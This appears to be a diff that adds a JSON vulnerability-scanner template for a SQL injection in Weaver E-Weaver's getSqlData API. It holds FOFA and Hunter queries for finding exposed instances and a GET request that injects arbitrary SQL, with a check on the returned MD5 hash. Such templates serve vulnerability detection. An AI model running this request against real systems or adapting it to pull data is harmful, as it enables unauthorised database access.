@@ -1,0 +1,34 @@
+{
+  "product": "泛微 E-Weaver",
+  "vul_name": "泛微 E-Weaver SQL注入getSqlData",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微 E-Weaver SQL注入getSqlData",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-E-Weaver\"",
+    "Hunter": "app.name=\"泛微 e-Weaver\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/u010025272/article/details/134486197",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20MD5(123456)"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
